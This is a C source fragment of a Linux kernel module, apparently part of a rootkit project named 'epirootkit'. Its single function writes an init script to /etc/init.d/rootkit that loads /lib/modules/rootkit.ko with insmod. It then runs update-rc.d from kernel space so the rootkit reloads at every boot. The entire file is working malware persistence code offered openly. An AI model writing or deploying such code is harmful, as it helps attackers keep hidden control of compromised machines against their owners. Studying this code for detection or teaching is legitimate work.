#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kmod.h>

#define PERSISTENT_SCRIPT_PATH "/etc/init.d/rootkit"
#define MODULE_PATH "/lib/modules/rootkit.ko"

int create_persistence_script(void)
{
    struct file *file;
    loff_t pos = 0;
    char *script_content = "#!/bin/sh\ninsmod " MODULE_PATH "\n";

    file = filp_open(PERSISTENT_SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (IS_ERR(file)) {
        printk(KERN_ERR "epirootkit: Failed to open persistence script.\n");
        return PTR_ERR(file);
    }

    kernel_write(file, script_content, strlen(script_content), &pos);
    filp_close(file, NULL);

    printk(KERN_INFO "epirootkit: Persistence script written at %s\n", PERSISTENT_SCRIPT_PATH);

    static char *argv[] = { "/usr/sbin/update-rc.d", "rootkit", "defaults", NULL };
    static char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    return 0;
}
